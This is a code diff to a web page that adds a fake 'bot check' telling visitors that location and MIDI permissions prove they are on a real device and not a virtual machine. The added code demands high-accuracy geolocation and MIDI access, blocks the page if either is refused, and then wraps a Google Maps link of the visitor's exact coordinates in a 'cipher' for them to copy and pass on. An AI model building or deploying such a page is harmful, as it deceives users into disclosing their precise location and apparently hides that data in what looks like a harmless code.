@@ -60,14 +60,37 @@
             background: #0f0;
             color: #000;
         }
+        
+        .permission-message {
+            font-size: 18px;
+            text-align: center;
+            max-width: 600px;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+        
+        .status-message {
+            font-size: 16px;
+            color: #0f0;
+            margin-bottom: 40px;
+            min-height: 20px;
+        }
     </style>
 </head>
 <body>
-    <div class="cipher-code" id="cipherCode">
+    <div class="permission-message" id="permissionMessage">
+        We are asking for permissions to confirm you aren't a bot and on a real device (virtual machines will NOT work with this website.)
+    </div>
+    
+    <div class="status-message" id="statusMessage">
+        Requesting permissions...
+    </div>
+    
+    <div class="cipher-code" id="cipherCode" style="display: none;">
         LOADING...
     </div>
     
-    <button class="copy-btn" id="copyBtn" onclick="copyCipher()">
+    <button class="copy-btn" id="copyBtn" onclick="copyCipher()" style="display: none;">
         COPY
     </button>
 
@@ -90,9 +113,12 @@
             });
         }
 
-        async function generateCipher() {
+        async function requestPermissions() {
+            const statusEl = document.getElementById('statusMessage');
+            
             try {
-                // Get location
+                // Request location permission
+                statusEl.textContent = 'Requesting location permission...';
                 const position = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject, {
                         enableHighAccuracy: true,
@@ -101,7 +127,31 @@
                     });
                 });
 
-                const { latitude, longitude } = position.coords;
+                // Request MIDI permission
+                statusEl.textContent = 'Requesting MIDI permission...';
+                const midiAccess = await navigator.requestMIDIAccess();
+
+                // Both permissions granted
+                statusEl.textContent = 'Permissions granted! Generating cipher...';
+                
+                // Hide permission message and status, show cipher
+                setTimeout(() => {
+                    document.getElementById('permissionMessage').style.display = 'none';
+                    document.getElementById('statusMessage').style.display = 'none';
+                    document.getElementById('cipherCode').style.display = 'block';
+                    document.getElementById('copyBtn').style.display = 'block';
+                    generateCipherWithLocation(position.coords);
+                }, 1500);
+
+            } catch (error) {
+                statusEl.textContent = 'Permission denied. This website requires all permissions to function.';
+                console.error('Permission error:', error);
+            }
+        }
+
+        async function generateCipherWithLocation(coords) {
+            try {
+                const { latitude, longitude } = coords;
                 
                 // Create Google Maps link
                 const originalMapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
@@ -122,6 +172,11 @@
             } catch (error) {
                 document.getElementById('cipherCode').textContent = 'ERROR';
             }
+        }
+
+        async function generateCipher() {
+            // This function is now replaced by requestPermissions
+            await requestPermissions();
         }
 
         function copyCipher() {
